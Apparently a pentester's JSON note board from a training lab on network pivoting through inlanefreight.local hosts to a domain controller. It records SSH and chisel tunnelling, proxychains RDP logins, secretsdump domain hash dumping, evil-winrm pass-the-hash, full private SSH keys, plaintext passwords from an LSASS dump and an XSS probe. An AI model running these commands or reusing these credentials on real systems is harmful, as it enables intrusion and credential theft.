@@ -1,0 +1,235 @@
+[
+  {
+    "id": 1757475181833,
+    "title": "inlanefreight.local",
+    "notes": [
+      {
+        "id": 1758002493413.748,
+        "title": "New Note",
+        "content": "<div>10.129.214.196</div><div>support.inlanefreight.local</div><div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><br></span></div>",
+        "x": 0,
+        "y": 8,
+        "width": 256,
+        "height": 172,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758405911717.6467,
+        "title": "Commands",
+        "content": "<div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">ssh -D 9050 -i id_rsa webadmin@10.129.229.129<br style=\"overflow-wrap: break-word; word-break: break-word;\"></span></span></div><div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><br></span></span></div><div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-resolution /drive:share,./dir<br style=\"overflow-wrap: break-word; word-break: break-word;\"></span></span></div><div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><span style=\"overflow-wrap: break-word; word-break: break-word;\" id=\"docs-internal-guid-7fe5369d-7fff-6ffe-4920-1169ee7cb01c\"><p dir=\"ltr\" style=\"line-height: 1.38; margin-left: 72pt; margin-top: 0pt; margin-bottom: 0pt; overflow-wrap: break-word; word-break: break-word;\"><br></p><div><span style=\"font-size: 11pt; font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><br></span></div></span></span></span></div>",
+        "x": 274,
+        "y": 2,
+        "width": 741,
+        "height": 167,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758411309828.19,
+        "title": "NICs",
+        "content": "<font color=\"#00cfff\">ens192</font>: 172.16.5.15<font color=\"#00cfff\">/16</font><script style=\"overflow-wrap: break-word; word-break: break-word;\">alert(1)</script>",
+        "x": 3,
+        "y": 191,
+        "width": 251,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758668321453.6882,
+        "title": "/home/webadmin/<font color=\"#ffa65c\">for-admin-eyes-only</font>",
+        "content": "<div><font color=\"#b28dff\">Host:</font><font color=\"#ffa65c\">&nbsp;</font>server01</div><div><span style=\"color: rgb(255, 166, 92);\">user: </span>mlefay</div><div><span style=\"color: rgb(255, 166, 92);\">password: </span>Plain Human work!</div><div><br></div><div><b>Content</b></div>\"# note to self,<div>in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay<br style=\"overflow-wrap: break-word; word-break: break-word;\">with a password of :<br style=\"overflow-wrap: break-word; word-break: break-word;\">Plain Human work!\"</div>",
+        "x": 0,
+        "y": 353,
+        "width": 401,
+        "height": 265,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758693711233.935,
+        "title": "<font color=\"#00ff88\">Active Hosts</font>",
+        "content": "<div>64 bytes from <font color=\"#00ff88\">172.16.5.35</font>: icmp_seq=1 ttl=128 time=1.78 ms</div>",
+        "x": 272,
+        "y": 187,
+        "width": 251,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758776681049.2966,
+        "title": "<font color=\"#ffa65c\">id_rsa</font> - /home/webadmin/id_rsa",
+        "content": "-----BEGIN OPENSSH PRIVATE KEY-----<br style=\"overflow-wrap: break-word; word-break: break-word;\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br style=\"overflow-wrap: break-word; word-break: break-word;\">NhAAAAAwEAAQAAAYEAvm9BTps6LPw35+tXeFAw/WIB/ksNIvt5iN7WURdfFlcp+T3fBKZD<br style=\"overflow-wrap: break-word; word-break: break-word;\">HaOQ1hl1+w/MnF+sO/K4DG6xdX+prGbTr/WLOoELCu+JneUZ3X8ajU/TWB3crYcniFUTgS<br style=\"overflow-wrap: break-word; word-break: break-word;\">PupztxZpZT5UFjrOD10BSGm1HeI5m2aqcZaxvn4GtXtJTNNsgJXgftFgPQzaOP0iLU42Bn<br style=\"overflow-wrap: break-word; word-break: break-word;\">IL/+PYNFsP4he27+1AOTNk+8UXDyNftayM/YBlTchv+QMGd9ojr0AwSJ9+eDGrF9jWWLTC<br style=\"overflow-wrap: break-word; word-break: break-word;\">o9NgqVZO4izemWTqvTcA4pM8OYhtlrE0KqlnX4lDG93vU9CvwH+T7nG85HpH5QQ4vNl+vY<br style=\"overflow-wrap: break-word; word-break: break-word;\">noRgGp6XIhviY+0WGkJ0alWKFSNHlB2cd8vgwmesCVUyLWAQscbcdB6074aFGgvzPs0dWl<br style=\"overflow-wrap: break-word; word-break: break-word;\">qLyTTFACSttxC5KOP2x19f53Ut52OCG5pPZbZkQxyfG9OIx3AWUz6rGoNk/NBoPDycw6+Y<br style=\"overflow-wrap: break-word; word-break: break-word;\">V8c1NVAJakIDRdWQ7eSYCiVDGpzk9sCvjWGVR1UrAAAFmDuKbOc7imznAAAAB3NzaC1yc2<br style=\"overflow-wrap: break-word; word-break: break-word;\">EAAAGBAL5vQU6bOiz8N+frV3hQMP1iAf5LDSL7eYje1lEXXxZXKfk93wSmQx2jkNYZdfsP<br style=\"overflow-wrap: break-word; word-break: break-word;\">zJxfrDvyuAxusXV/qaxm06/1izqBCwrviZ3lGd1/Go1P01gd3K2HJ4hVE4Ej7qc7cWaWU+<br style=\"overflow-wrap: break-word; word-break: break-word;\">VBY6zg9dAUhptR3iOZtmqnGWsb5+BrV7SUzTbICV4H7RYD0M2jj9Ii1ONgZyC//j2DRbD+<br style=\"overflow-wrap: break-word; word-break: break-word;\">IXtu/tQDkzZPvFFw8jX7WsjP2AZU3Ib/kDBnfaI69AMEiffngxqxfY1li0wqPTYKlWTuIs<br style=\"overflow-wrap: break-word; word-break: break-word;\">3plk6r03AOKTPDmIbZaxNCqpZ1+JQxvd71PQr8B/k+5xvOR6R+UEOLzZfr2J6EYBqelyIb<br style=\"overflow-wrap: break-word; word-break: break-word;\">4mPtFhpCdGpVihUjR5QdnHfL4MJnrAlVMi1gELHG3HQetO+GhRoL8z7NHVpai8k0xQAkrb<br style=\"overflow-wrap: break-word; word-break: break-word;\">cQuSjj9sdfX+d1LedjghuaT2W2ZEMcnxvTiMdwFlM+qxqDZPzQaDw8nMOvmFfHNTVQCWpC<br style=\"overflow-wrap: break-word; word-break: break-word;\">A0XVkO3kmAolQxqc5PbAr41hlUdVKwAAAAMBAAEAAAGAJ8GuTqzVfmLBgSd+wV1sfNmjNO<br style=\"overflow-wrap: break-word; word-break: break-word;\">WSPoVloA91isRoU4+q8Z/bGWtkg6GMMUZrfRiVTOgkWveXOPE7Fx6p25Y0B34prPMXzRap<br style=\"overflow-wrap: break-word; word-break: break-word;\">Ek+sELPiZTIPG0xQr+GRfULVqZZI0pz0Vch4h1oZZxQn/WLrny1+RMxoauerxNK0nAOM8e<br style=\"overflow-wrap: break-word; word-break: break-word;\">RG23Lzka/x7TCqvOOyuNoQu896eDnc6BapzAOiFdTcWoLMjwAifpYn2uE42Mebf+bji0N7<br style=\"overflow-wrap: break-word; word-break: break-word;\">ZL+WWPIZ0y91Zk3s7vuysDo1JmxWWRS1ULNusSSnWO+1msn2cMw5qufgrZlG6bblx32mpU<br style=\"overflow-wrap: break-word; word-break: break-word;\">XC1ylwQmgQjUaFJP1VOt+JrZKFAnKZS1cjwemtjhup+vJpruYKqOfQInTYt9ZZ2SLmgIUI<br style=\"overflow-wrap: break-word; word-break: break-word;\">NMpXVqIhQdqwSl5RudhwpC+2yroKeyeA5O+g2VhmX4VRxDcPSRmUqgOoLgdvyE6rjJO5AP<br style=\"overflow-wrap: break-word; word-break: break-word;\">jS0A/I3JTqbr15vm7Byufy691WWHI1GA6jA9/5NrBqyAFyaElT9o+BFALEXX9m1aaRAAAA<br style=\"overflow-wrap: break-word; word-break: break-word;\">wQDL9Mm9zcfW8Pf+Pjv0hhnF/k93JPpicnB9bOpwNmO1qq3cgTJ8FBg/9zl5b5EOWSyTWH<br style=\"overflow-wrap: break-word; word-break: break-word;\">4aEQNg3ON5/NwQzdwZs5yWBzs+gyOgBdNl6BlG8c04k1suXx71CeN15BBe72OPctsYxDIr<br style=\"overflow-wrap: break-word; word-break: break-word;\">0syP7MwiAgrz0XP3jCEwq6XoBrE0UVYjIQYA7+oGgioY2KnapVYDitE99nv1JkXhg0jt/m<br style=\"overflow-wrap: break-word; word-break: break-word;\">MTrEmSgWmr4yyXLRSuYGLy0DMGcaCA6Rpj2xuRsdrgSv5N0ygAAADBAOVVBtbzCNfnOl6Q<br style=\"overflow-wrap: break-word; word-break: break-word;\">NpX2vxJ+BFG9tSSdDQUJngPCP2wluO/3ThPwtJVF+7unQC8za4eVD0n40AgVfMdamj/Lkc<br style=\"overflow-wrap: break-word; word-break: break-word;\">mkEyRejQXQg1Kui/hKD9T8iFw7kJ2LuPcTyvjMyAo4lkUrmHwXKMO0qRaCo/6lBzShVlTK<br style=\"overflow-wrap: break-word; word-break: break-word;\">u+GTYMG4SNLucNsflcotlVGW44oYr/6Em5lQ3o1OhhoI90W4h3HK8FLqldDRbRxzuYtR13<br style=\"overflow-wrap: break-word; word-break: break-word;\">DAK7kgvoiXzQwAcdGhXnPMSeWZTlOuTQAAAMEA1JRKN+Q6ERFPn1TqX8b5QkJEuYJQKGXH<br style=\"overflow-wrap: break-word; word-break: break-word;\">SQ1Kzm02O5sQQjtxy+iAlYOdU41+L0UVAK+7o3P+xqfx/pzZPX8Z+4YTu8Xq41c/nY0kht<br style=\"overflow-wrap: break-word; word-break: break-word;\">rFHqXT6siZzIfVOEjMi8HL1ffhJVVW9VA5a4S1zp9dbwC/8iE4n+P/EBsLZCUud//bBlSp<br style=\"overflow-wrap: break-word; word-break: break-word;\">v0bfjDzd4sFLbVv/YWVLDD3DCPC3PjXYHmCpA76qLzlJP26fSMbw7TbnZ2dxum3wyxse5j<br style=\"overflow-wrap: break-word; word-break: break-word;\">MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY=<br style=\"overflow-wrap: break-word; word-break: break-word;\">-----END OPENSSH PRIVATE KEY-----<br style=\"overflow-wrap: break-word; word-break: break-word;\">",
+        "x": 416,
+        "y": 351,
+        "width": 300,
+        "height": 225,
+        "style": {},
+        "currentColor": "#ffffff"
+      }
+    ]
+  },
+  {
+    "id": 1757475181834,
+    "title": "PIVOT-SRV01",
+    "notes": [
+      {
+        "id": 1758776841482.087,
+        "title": "Host",
+        "content": "<b>Hostname</b>:&nbsp;PIVOT-SRV01<div><b>Ethernet0</b>: 172.16.5.35</div><div><b>Ethernet1 2</b>: 172.16.<font color=\"#00ff88\">6</font>.35</div>",
+        "x": 3,
+        "y": 15,
+        "width": 250,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758776940198.0142,
+        "title": "Commands",
+        "content": "<div>ssh -F ./config -D 9050 pivot2</div><div><div style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">proxychains xfreerdp /v:172.16.6.25 /u:<span style=\"color: rgb(224, 224, 224); font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">vfrank</span>&nbsp;/p:'<span style=\"color: rgb(224, 224, 224); font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">Imply wet Unmasked!</span>' /dynamic-resolution /drive:share,./dir<br style=\"overflow-wrap: break-word; word-break: break-word;\"></span></span></div><div style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><span id=\"docs-internal-guid-7fe5369d-7fff-6ffe-4920-1169ee7cb01c\" style=\"overflow-wrap: break-word; word-break: break-word;\"><p dir=\"ltr\" style=\"margin-top: 0pt; margin-bottom: 0pt; margin-left: 72pt; line-height: 1.38; overflow-wrap: break-word; word-break: break-word;\"><br style=\"font-size: 14.6667px; overflow-wrap: break-word; word-break: break-word;\"></p></span></span></span></div></div><div><br></div>",
+        "x": 271,
+        "y": 10,
+        "width": 767,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758776950319.8845,
+        "title": "<font color=\"#ffa65c\">id_rsa</font> -&nbsp;C:\\Users\\<font color=\"#ffa65c\">mlefay</font>\\.ssh\\id_rsa",
+        "content": "-----BEGIN RSA PRIVATE KEY-----<br style=\"overflow-wrap: break-word; word-break: break-word;\">MIIEpAIBAAKCAQEAtTeNd5feAkLyya4xQAtapjLQBeQiSD8/lXKea57YUt+1UUI3<br style=\"overflow-wrap: break-word; word-break: break-word;\">gtc5rTG+SCmgqsv5Xo43kP5wS74I7m9U6LcZ3gBZudbZ9/aZmf8/O5hj8PkoAPyl<br style=\"overflow-wrap: break-word; word-break: break-word;\">n3qxp9eJOnzyVRJ2WuDt6qDu16ytytWb199dk7bNk5kdiKhjO/JaMvi5hCrgky0K<br style=\"overflow-wrap: break-word; word-break: break-word;\">PfFUuN8CbnVfn5jGrnJskVQBOIGXLh5RtPjwkn2xin6SOJT+Gn5l12G2571Fs7s2<br style=\"overflow-wrap: break-word; word-break: break-word;\">hhAWlhID5H5+GWABtcAzEys+qGwXj5qgU+L1SUZ3QtIswKDdES7E81Qb3wvhyoEF<br style=\"overflow-wrap: break-word; word-break: break-word;\">F6Uv8COTack/RiV5mtts5OgN5tMM3wzwoFWm1wIDAQABAoIBAFXqK5DamG/cC71g<br style=\"overflow-wrap: break-word; word-break: break-word;\">b4sclvKavpM8cKBuFBgnikIdwhOwagdHbIgEwByDq+IMklbHc8fHh0Kfzt+qDhP1<br style=\"overflow-wrap: break-word; word-break: break-word;\">Bn16abId2mxIF3j/Gh2vrOv1ONTDW5r0LRWqFtYrUq0/FakNor09TK7jc7ke7hpv<br style=\"overflow-wrap: break-word; word-break: break-word;\">IX68MGJa1aY3fpAOvVVrdiYaU+H7obrjjM6zibujok+khHADRUlY8eiRDuXlGfhg<br style=\"overflow-wrap: break-word; word-break: break-word;\">YXKB78Daj4b0JJbB3Okxxbha80cvgCAOOHlBzPUg1RznK6kaqruobdhKqDJ5ql1A<br style=\"overflow-wrap: break-word; word-break: break-word;\">EbgsEP9FQGgpdqLn6kwEWCyb+dXTDX9YyeVrg3JjjkRfzavL6t5gkItVpF1FawHu<br style=\"overflow-wrap: break-word; word-break: break-word;\">XLSfGTkCgYEA3qpF67gO5T7eevvchdl3SA5vb7WGgBRALlEmVku1rKub3A4i7quN<br style=\"overflow-wrap: break-word; word-break: break-word;\">uxsi+bZUmsC9MUWfu1FRMFvNsLUsEqQgd6eDpYFMlGbTAeqecDzdSCV11jTo4dbu<br style=\"overflow-wrap: break-word; word-break: break-word;\">Y0A86kw1w1FIqHhCXrpkMWK7u87aGAMqsLUlrlnynQ+T+7MQofgIxnUCgYEA0FjD<br style=\"overflow-wrap: break-word; word-break: break-word;\">mCXcsoiuaNH965MRFGZ3nIWQOcpj/7XrlWLblME8FTpqBzzbdwLUE+1vdL0xxJAh<br style=\"overflow-wrap: break-word; word-break: break-word;\">4xLY7vQYbK3ZUtybL2fDJPNo0vcK6yfYO3VBbw4HSmQeenEWWYTkRjt7AA7nlszE<br style=\"overflow-wrap: break-word; word-break: break-word;\">deqFDRqErqYUzEE6Ysc+/lK/2wUfvUcIJEiLxpsCgYEArdGOM6zDNAIX+zmRtItG<br style=\"overflow-wrap: break-word; word-break: break-word;\">qmFabIHwNRuZ3o5KtyLy95AfY3FFo7sYMO/GJdlHwmajSktnnfqkvnNr5n4HoaWu<br style=\"overflow-wrap: break-word; word-break: break-word;\">EroZ8qE0/sQmBGD6vfNFaoSTsFwtT99QyPnkk6JaddaGOb1nUjt+625/zuRzLDuM<br style=\"overflow-wrap: break-word; word-break: break-word;\">n9VJTQm6cxEuHFZ0rXvKneECgYEAnSAkOo1rWNWNuw2LUusxuVHhqRBtibfiHIoF<br style=\"overflow-wrap: break-word; word-break: break-word;\">Jj9M3G2ys0u/hL/Xv3RJntG0+bRpYRVWCRtAsU0zUlr2B/DJtEGrwSU1C8011czR<br style=\"overflow-wrap: break-word; word-break: break-word;\">3V17wJYy116UQcEhmteHFJRtGckjzO2WyFrahtxV7iTgkH4s2yvqjQC5IiNGIYf9<br style=\"overflow-wrap: break-word; word-break: break-word;\">UufHSjsCgYAkuAwMp9La+4SwqlbwYOLmBUWKfxe45l2i6p/8pe5Xk7a0hYOUcwzS<br style=\"overflow-wrap: break-word; word-break: break-word;\">qP9vLkwZsRUkJMjBbzhIirOChMbwKpZZhN0R5uZlCX+/JSrzHzOn6Pwj2ZQpOdvx<br style=\"overflow-wrap: break-word; word-break: break-word;\">MS0L8O4tytdX50KZ4VgeAKlztEUUAodbvtKGkvGCu0muER68IhXB/g==<br style=\"overflow-wrap: break-word; word-break: break-word;\">-----END RSA PRIVATE KEY-----<br style=\"overflow-wrap: break-word; word-break: break-word;\">",
+        "x": 2,
+        "y": 181,
+        "width": 299,
+        "height": 151,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758780397254.962,
+        "title": "<font color=\"#00ff88\">Active Hosts</font>",
+        "content": "[+] Active Host: <font color=\"#00ff88\">172.16.6.25</font><br style=\"overflow-wrap: break-word; word-break: break-word;\">[+] Active Host: <font color=\"#00ff88\">172.16.6.45</font><br style=\"overflow-wrap: break-word; word-break: break-word;\">",
+        "x": 316,
+        "y": 178,
+        "width": 318,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758829197203.027,
+        "title": "<font color=\"#ffa65c\">lssas.DMP</font>",
+        "content": "<div><font color=\"#b28dff\">Service</font>:<font color=\"#b28dff\">&nbsp;</font>Kerberos</div><font color=\"#ffa65c\">User</font>: vfrank<div><font color=\"#ffa65c\">Password</font>: Imply wet Unmasked!</div>",
+        "x": 0,
+        "y": 348,
+        "width": 256,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758829596729.113,
+        "title": "<font color=\"#00cfff\">172.16.6.25 </font>- Ports",
+        "content": "Port <font color=\"#00cfff\">135</font><br style=\"overflow-wrap: break-word; word-break: break-word;\">Port <font color=\"#00cfff\">139</font>&nbsp;<br style=\"overflow-wrap: break-word; word-break: break-word;\">Port <font color=\"#00cfff\">445</font>&nbsp;<br style=\"overflow-wrap: break-word; word-break: break-word;\">Port <font color=\"#00cfff\">3389</font>&nbsp;<br style=\"overflow-wrap: break-word; word-break: break-word;\"><div>Port <font color=\"#00cfff\">5985</font></div>",
+        "x": 650,
+        "y": 177,
+        "width": 250,
+        "height": 162,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758829871018.5325,
+        "title": "<font color=\"#00cfff\">172.16.6.45&nbsp;</font>- Ports",
+        "content": "<span style=\"overflow-wrap: break-word; word-break: break-word;\">Port<span style=\"overflow-wrap: break-word; word-break: break-word;\">&nbsp;</span></span><font color=\"#00cfff\" style=\"overflow-wrap: break-word; word-break: break-word;\">22</font>",
+        "x": 648,
+        "y": 354,
+        "width": 250,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      }
+    ]
+  },
+  {
+    "id": 1757475181835,
+    "title": "PIVOTWIN10",
+    "notes": [
+      {
+        "id": 1758839260209.9722,
+        "title": "Host",
+        "content": "<b>Hostname</b>:&nbsp;PIVOTWIN10<div><b>Ethernet0 2:</b>&nbsp;172.16.6.25</div><div><b>Ethernet1 2</b>:&nbsp;172.16.<font color=\"#00ff88\">10</font>.25</div>",
+        "x": 0,
+        "y": 16,
+        "width": 250,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758839323996.1626,
+        "title": "<font color=\"#00ff88\">Active Hosts</font>",
+        "content": "<font color=\"#00ff88\">172.16.10.5</font>&nbsp;&nbsp;",
+        "x": 0,
+        "y": 185,
+        "width": 250,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758842354887.4763,
+        "title": "Commands",
+        "content": "<span style=\"overflow-wrap: break-word; word-break: break-word;\" id=\"docs-internal-guid-178e01af-7fff-75d5-14a1-c8552c09dc14\"><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(197, 244, 103); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">proxychains</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(240, 246, 252); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">&nbsp;</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(255, 175, 0); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">secretsdump</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(240, 246, 252); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">.py&nbsp;</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(240, 246, 252); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><span style=\"color: rgb(224, 224, 224); font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">vfrank</span>:</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(165, 214, 255); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">'</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(165, 214, 255); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><span style=\"color: rgb(224, 224, 224); font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">Imply wet Unmasked!</span>'</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(240, 246, 252); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">@</span><span style=\"font-size: 10pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(240, 246, 252); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><font color=\"#00ff88\" style=\"font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">172.16.10.5</font><span style=\"color: rgb(224, 224, 224); font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">&nbsp;&nbsp;</span>-just-dc</span></span><div><br></div><div><font color=\"#b28dff\" style=\"\"><b>pivot2 </b>(PIVOT-SRV01)<b>:</b></font> chisel.exe server --port 8000 --reverse</div><div><font color=\"#b28dff\" style=\"\"><b>pivot3 </b>(</font><font color=\"#b28dff\">PIVOTWIN10)</font><font color=\"#b28dff\" style=\"font-weight: bold;\">:</font> chisel.exe client 172.16.6.35:8000 R:0.0.0.0:9050:socks</div><div>ssh -F ./config -L 9050:127.0.0.1:9050 pivot2 -N -v<br style=\"overflow-wrap: break-word; word-break: break-word;\"></div><div><br></div><div><br></div>",
+        "x": 271,
+        "y": 12,
+        "width": 764,
+        "height": 251,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758843383811.1326,
+        "title": "<font color=\"#00cfff\">172.16.10.5&nbsp;</font>- Ports",
+        "content": "<div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"overflow-wrap: break-word; word-break: break-word;\">Port <font color=\"#00cfff\">135</font></span><br style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"overflow-wrap: break-word; word-break: break-word;\">Port <font color=\"#00cfff\">139</font></span></span></div><div><span style=\"overflow-wrap: break-word; word-break: break-word;\">Port<span style=\"overflow-wrap: break-word; word-break: break-word;\">&nbsp;</span></span><font color=\"#00cfff\" style=\"overflow-wrap: break-word; word-break: break-word;\">389</font></div>Port <font color=\"#00cfff\">445</font><div>Port <font color=\"#00cfff\">5985</font><br style=\"overflow-wrap: break-word; word-break: break-word;\"><br></div>",
+        "x": 0,
+        "y": 352,
+        "width": 250,
+        "height": 188,
+        "style": {},
+        "currentColor": "#ffffff"
+      }
+    ]
+  },
+  {
+    "id": 1757475181836,
+    "title": "ACADEMY-PIVOT-DC01",
+    "notes": [
+      {
+        "id": 1758855956326.512,
+        "title": "Host",
+        "content": "<b>Hostname</b>:&nbsp;ACADEMY-PIVOT-DC01<br><div><b>Ethernet0</b>: 172.16.10.5</div>",
+        "x": 1,
+        "y": 11,
+        "width": 277,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      },
+      {
+        "id": 1758856401486.6,
+        "title": "Commands",
+        "content": "<span style=\"overflow-wrap: break-word; word-break: break-word;\" id=\"docs-internal-guid-6f644c36-7fff-4376-9c3c-947f338271ff\"><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(255, 175, 0); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">evil-winrm</span><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"> -i&nbsp;</span><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><span style=\"color: rgb(224, 224, 224); font-family: &quot;Winky Sans&quot;, sans-serif; font-size: medium; overflow-wrap: break-word; word-break: break-word;\">172.16.10.5</span>&nbsp;-u </span><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(255, 62, 62); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">Administrator</span><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(164, 177, 205); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"> -H </span><span style=\"font-size: 11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(255, 62, 62); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\">bdaffbfe64f1fc646a3353be1c2c3c99</span></span><div><span style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"font-size: 